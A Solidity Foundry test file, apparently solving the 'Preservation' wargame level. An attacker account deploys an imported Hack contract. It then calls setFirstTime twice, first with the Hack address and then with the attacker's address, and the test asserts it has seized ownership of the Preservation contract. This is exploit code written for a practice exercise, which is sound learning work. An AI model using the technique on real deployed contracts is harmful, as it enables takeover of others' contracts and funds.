// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { Preservation, LibraryContract } from "./Preservation.sol";
import { Hack } from "./PreservationHack.sol";

contract PreservationTest is Test {
    Preservation preservation;
    Hack hack;
    LibraryContract timeLib1;
    LibraryContract timeLib2;

    address deployer = vm.addr(7);
    address h3x0r = vm.addr(1337);

    function setUp() public {
        vm.startPrank(deployer);
        timeLib1 = new LibraryContract();
        timeLib2 = new LibraryContract();
        preservation = new Preservation(
            address(timeLib1),
            address(timeLib2)
        );
        vm.stopPrank();
    }

    function testPreservationHack() public {
        vm.startPrank(h3x0r);
        hack = new Hack();
        uint256 uintCastedHack = uint256(uint160(address(hack)));
        uint256 uintCastedh3x0r = uint256(uint160(h3x0r));
        address hackAddress = address(uint160(uintCastedHack));
        
        assertEq(hackAddress, address(hack));

        preservation.setFirstTime(uintCastedHack);
        preservation.setFirstTime(uintCastedh3x0r);
        
        assertEq(preservation.owner(), h3x0r);
    }
}